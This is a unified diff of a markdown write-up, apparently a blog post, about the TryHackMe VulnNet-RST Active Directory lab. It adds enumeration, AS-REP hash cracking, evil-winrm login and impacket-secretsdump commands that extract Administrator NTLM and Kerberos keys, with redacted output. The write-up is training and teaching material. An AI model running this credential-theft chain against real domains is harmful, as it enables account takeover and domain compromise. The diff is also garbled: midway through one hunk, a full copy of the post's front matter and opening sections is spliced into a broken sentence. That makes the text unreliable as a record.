@@ -16,7 +16,10 @@ This case study documents my hands-on assessment of the **VulnNet-RST Active Dir
 
 The strongest verified result was the successful retrieval of **Administrator NTLM material and Kerberos keys** using Impacket's `secretsdump` functionality. This is evidence of a serious Active Directory privilege boundary failure within the lab. It is **not** a claim of a production engagement, and the records available to me do **not** establish that I captured a final room flag.
 
-This article is an **evidence-based technical case study** rather than a fabricated command-by-command transcript. Passwords, hashes, flags and target-specific credentials are deliberately omitted.
+This write-up now includes **commands from my April 2026 terminal session**, with short interpretations of the results. Where the exact historical command was not preserved, I say so instead of presenting a guessed command as something I ran. Passwords, hashes and flags are omitted; commands that originally embedded a password are shown in an equivalent **sanitized form using shell variables**.
+
+> **Lab IP note:** TryHackMe target addresses changed between sessions. My initial enumeration targeted `10.128.134.155`; later authenticated testing targeted `10.128.182.129`. These were temporary lab addresses, not permanent infrastructure.
+
 
 ## 1. Scope and objectives
 
@@ -59,7 +62,117 @@ This stage illustrated two points:
 - An account with limited permissions can still reveal information that is useful for further assessment.
 - A readable share is not automatically a vulnerability; the security impact depends on **which information is exposed** and whether it enables a meaningful next step.
 
-**Relevant tools/protocols:** SMB, NetExec, smbclient, Windows domain account enumeration.
+### Terminal evidence: domain enumeration
+
+The following command is preserved from my initial terminal session:
+
+```bash
+enum4linux -A 10.128.134.155
+```
+
+The output identified the **VULNNET-RST** domain, permitted an anonymous/null SMB session, and exposed domain identity information including the SID:
+
+```text
+Domain Name: VULNNET-RST
+Domain SID: S-1-5-21-1589833671-435344116-4136949213
+```
+
+RID enumeration was part of the account-discovery workflow, but I do **not** have its exact historical command line preserved.
+
+### Terminal evidence: authenticated SMB
+
+After the lab IP changed, I validated the recovered `t-skid` account with NetExec. The original password has been removed from the command below.
+
+```bash
+read -rsp 'Password for t-skid: ' TSKID_PASSWORD; echo
+nxc smb 10.128.182.129 -u 't-skid' -p "$TSKID_PASSWORD" --shares
+```
+
+The recorded output identified **Windows Server 2019 (build 17763)** in `vulnnet-rst.local`, confirmed successful authentication and listed readable shares, including `IPC---
+layout: post
+title: "TryHackMe — VulnNet-RST | Active Directory attack-chain assessment"
+date: 2026-11-10 00:00:00 +0100
+categories: [TryHackMe, Active Directory]
+tags: [tryhackme, active-directory, kerberos, smb, asrep-roasting, evil-winrm, impacket, dcsync, pentest]
+description: "Evidence-based case study of a VulnNet-RST Windows domain lab: SMB and account enumeration, AS-REP Roasting, WinRM access and DRSUAPI credential extraction."
+mermaid: true
+---
+
+> **Platform:** TryHackMe · **Lab:** VulnNet-RST · **Environment:** Windows Server / Active Directory · **Work performed:** April 2026 · **Type:** Authorized training lab
+
+## Executive summary
+
+This case study documents my hands-on assessment of the **VulnNet-RST Active Directory environment**. The exercise connected several stages of an internal Windows domain attack: discovering domain users, identifying an account exposed to AS-REP Roasting, recovering a password offline, assessing SMB access, obtaining an authorized lab shell over WinRM, and validating the impact of directory replication rights through **DRSUAPI-based credential extraction**.
+
+The strongest verified result was the successful retrieval of **Administrator NTLM material and Kerberos keys** using Impacket's `secretsdump` functionality. This is evidence of a serious Active Directory privilege boundary failure within the lab. It is **not** a claim of a production engagement, and the records available to me do **not** establish that I captured a final room flag.
+
+This write-up now includes **commands from my April 2026 terminal session**, with short interpretations of the results. Where the exact historical command was not preserved, I say so instead of presenting a guessed command as something I ran. Passwords, hashes and flags are omitted; commands that originally embedded a password are shown in an equivalent **sanitized form using shell variables**.
+
+> **Lab IP note:** TryHackMe target addresses changed between sessions. My initial enumeration targeted `10.128.134.155`; later authenticated testing targeted `10.128.182.129`. These were temporary lab addresses, not permanent infrastructure.
+
+
+## 1. Scope and objectives
+
+The target was a Windows Server domain environment with common enterprise authentication and file-sharing services. The practical objectives were to:
+
+1. Discover exposed Windows and Active Directory services.
+2. Enumerate domain identities and accessible SMB resources.
+3. Assess Kerberos pre-authentication exposure and password strength.
+4. Test whether recovered credentials enabled remote management access.
+5. Determine the effective impact of privileged directory permissions.
+6. Document attack-path causes and defensive measures.
+
+All actions were performed within the training environment.
+
+## 2. Validated attack-chain overview
+
+The following diagram summarizes the **observed phases**. It intentionally does not invent the exact intermediate mechanism by which the second account's credentials were discovered.
+
+```mermaid
+flowchart TD
+    A["Windows / AD service discovery"] --> B["SMB and domain user enumeration"]
+    B --> C["AS-REP Roasting<br/>Offline password recovery"]
+    C --> D["SMB access and share review"]
+    D --> E["Further credential discovery<br/>Secondary account"]
+    E --> F["Authenticated WinRM shell"]
+    F --> G["DRSUAPI directory replication<br/>Impacket secretsdump"]
+    G --> H["Administrator NTLM material<br/>and Kerberos keys retrieved"]
+```
+
+**Important distinction:** the first recovered account did not immediately provide WinRM access. The later WinRM shell used a different account. The exact source of that second account's credentials is not reconstructed here because the retained evidence is insufficient to describe it reliably.
+
+## 3. Reconnaissance and SMB enumeration
+
+The initial work focused on the domain's Windows services and the information available through SMB and account enumeration. Guest/anonymous access was useful for establishing the environment's structure, and RID-based enumeration helped identify candidate domain accounts.
+
+With a recovered domain user's credentials, I was able to authenticate to SMB and review accessible shares. The documented environment exposed standard domain resources such as **NETLOGON** and **SYSVOL**, along with additional business-oriented shares.
+
+This stage illustrated two points:
+
+- An account with limited permissions can still reveal information that is useful for further assessment.
+- A readable share is not automatically a vulnerability; the security impact depends on **which information is exposed** and whether it enables a meaningful next step.
+
+, `NETLOGON`, `SYSVOL`, `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous`.
+
+I then listed shares and browsed a business share using `smbclient` (password passed through the same shell variable rather than embedded in the public write-up):
+
+```bash
+smbclient -L //10.128.182.129/ -U "t-skid%$TSKID_PASSWORD"
+smbclient //10.128.182.129/VulnNet-Business-Anonymous -U "t-skid%$TSKID_PASSWORD"
+```
+
+Inside the interactive SMB session:
+
+```text
+smb: \\> ls
+  Business-Manager.txt
+  Business-Sections.txt
+  Business-Tracking.txt
+```
+
+**Interpretation:** valid low-privilege domain credentials gave access to multiple shares. The listing alone does not prove sensitive data exposure; that requires reviewing actual file contents and permissions.
+
+**Relevant tools/protocols:** enum4linux, SMB, NetExec, smbclient, Windows domain account enumeration.
 
 ## 4. Kerberos exposure: AS-REP Roasting
 
@@ -67,7 +180,25 @@ The account-enumeration stage identified an identity susceptible to **AS-REP Roa
 
 In this lab, the AS-REP material was successfully cracked and a working domain password was recovered. I then validated the account's access, including SMB authentication.
 
-The first attempt to use those credentials for **WinRM** did **not** grant remote shell access. This was an important finding: **valid domain credentials do not imply permission to log in remotely**.
+### Terminal evidence: offline password recovery
+
+I saved the AS-REP response in `hash.txt` and ran the following **recorded** John the Ripper command:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+John recovered the password for the `t-skid` account. The recovered secret is not published here. The precise historical command used to request the AS-REP material was not preserved, so I have not invented one.
+
+### Terminal evidence: WinRM access denied
+
+I then attempted WinRM with `t-skid`:
+
+```bash
+evil-winrm -i 10.128.182.129 -u t-skid -p "$TSKID_PASSWORD"
+```
+
+The attempt produced a WinRM authorization error; it did **not** establish a usable administrative shell. This was an important finding: **valid domain credentials do not imply permission to log in remotely**.
 
 ### Defensive interpretation
 
@@ -82,6 +213,24 @@ After further investigation, a **second domain account** was used to obtain an a
 
 I did not treat shell access itself as proof of domain administration. Instead, the next step was to verify the effective directory permissions by testing a concrete capability.
 
+### Terminal evidence: successful shell with another account
+
+The later authenticated session used a **different** domain identity, `a-whitehat`. To avoid publishing the lab password, this version prompts for it:
+
+```bash
+read -rsp 'Password for a-whitehat: ' AWHITEHAT_PASSWORD; echo
+evil-winrm -i 10.128.182.129 -u a-whitehat -p "$AWHITEHAT_PASSWORD"
+```
+
+Recorded shell validation:
+
+```powershell
+PS C:\\Users\\a-whitehat\\Documents> whoami
+vulnnet-rst\\a-whitehat
+```
+
+The evidence confirms a working WinRM shell as `a-whitehat`. It does **not** establish precisely how this account's credentials were found, so that intermediate step is left unclaimed.
+
 **Relevant tools/protocols:** Evil-WinRM, Windows authentication, Active Directory permission analysis.
 
 ## 6. DRSUAPI credential extraction: verified impact
@@ -90,6 +239,26 @@ The decisive result came from an Impacket `secretsdump` operation targeting the 
 
 - NTLM credential material for the domain Administrator account.
 - Associated Kerberos AES key material.
+
+### Terminal evidence: targeted directory replication
+
+The following command preserves the **tool, account, target and options I actually used**, but substitutes the previously prompted password for the original inline secret:
+
+```bash
+impacket-secretsdump "vulnnet-rst.local/a-whitehat:$AWHITEHAT_PASSWORD@10.128.182.129" -just-dc-user Administrator
+```
+
+The observed result, redacted for publication, had this structure:
+
+```text
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+vulnnet-rst.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:[NTLM_REDACTED]:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:[AES256_REDACTED]
+Administrator:aes128-cts-hmac-sha1-96:[AES128_REDACTED]
+```
+
+This is a **redacted schematic of the observed result**, not a byte-for-byte terminal transcript. The crucial verified fact is that the operation returned the Administrator's NTLM material and Kerberos keys.
 
 This demonstrates the impact of directory replication privileges: an identity able to perform sensitive replication operations may extract password-related material from Active Directory without needing interactive login as the affected user.
 
@@ -115,7 +284,9 @@ The key technical lesson is to distinguish **being able to authenticate**, **hav
 - Subsequent WinRM shell access using another account.
 - Successful DRSUAPI extraction of Administrator NTLM material and Kerberos keys.
 
-**Not claimed:** a verified final flag submission, a production-system compromise, or an exact intermediate credential-discovery technique where the evidence is incomplete.
+**Not claimed:** a verified final flag submission, a production-system compromise, the exact AS-REP request or RID-brute command line, or an exact intermediate credential-discovery technique where the evidence is incomplete.
+
+**Command provenance:** `enum4linux -A`, `john --wordlist`, `nxc smb --shares`, the two `smbclient` sessions, both `evil-winrm` attempts and `impacket-secretsdump -just-dc-user Administrator` are grounded in the retained April 2026 lab session. Password handling and selected output have been sanitized for public publication.
 
 ## 8. What this project demonstrates
 
@@ -123,4 +294,4 @@ This lab gave me practical experience in **Windows/AD enumeration, Kerberos secu
 
 For an offensive-security or Red Team internship, the value is not merely running tools: it is following the relationship between **identity configuration, authentication boundaries, delegated rights and the actual security impact**.
 
-*Authorized lab exercise. No passwords, hashes or target-specific secrets are published in this case study.*
+*Authorized lab exercise. No passwords, hashes or target-specific secrets are published in this case study. Commands are shown only for this permitted training environment.*
